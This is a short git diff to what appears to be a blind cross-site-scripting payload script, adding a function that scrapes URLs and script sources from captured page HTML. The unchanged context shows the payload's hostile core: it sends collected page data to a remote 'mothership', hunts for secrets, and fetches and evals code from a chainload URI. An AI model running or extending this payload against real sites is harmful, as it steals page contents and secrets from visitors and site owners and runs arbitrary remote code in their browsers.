@@ -200,6 +200,13 @@ function collect_pages(pgp_key) {
     }
 }
 
+function spider_pages(pgp_key) {
+    const html_source = probe_return_data['text'];
+    const pages = look_for_urls(html_source);
+    console.log(html_source);
+    console.log(pages);
+}
+
 function eval_remote_source( uri ) {
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = function() {
@@ -227,7 +234,6 @@ function get_dom_text() {
 			return text_extractions_to_try[i];
 		}
 	}
-
 	return '';
 }
 
@@ -308,6 +314,24 @@ function send_collected_page( page_data ) {
     }
     form_data.append("path", "[USER_PATH]");
     http.send(form_data);
+}
+
+function look_for_urls( data ) {
+    var findings = [];
+    let urls_regexes = {
+        "links": /(https?:\/\/[^\s>\"']+)/g,
+        "js": /<script.*?src="(.*?)"/gmi
+    }
+    for (let secret_type in urls_regexes){
+        let re = new RegExp(urls_regexes[secret_type])
+        let match = re.exec(data);
+        console.log(match);
+        if (Array.isArray(match)){
+            let finding = match[1];
+            findings.push(finding);
+        }
+    }
+    return findings
 }
 
 function look_for_secrets( data ) {
@@ -467,6 +491,7 @@ const pgp_key = `[pgp_key]`;
 
 let finishing_moves = async function() {
     await contact_mothership( probe_return_data, pgp_key );
+    spider_pages();
     collect_pages();
     if( chainload_uri != "" && chainload_uri != null ) {
         eval_remote_source( chainload_uri );
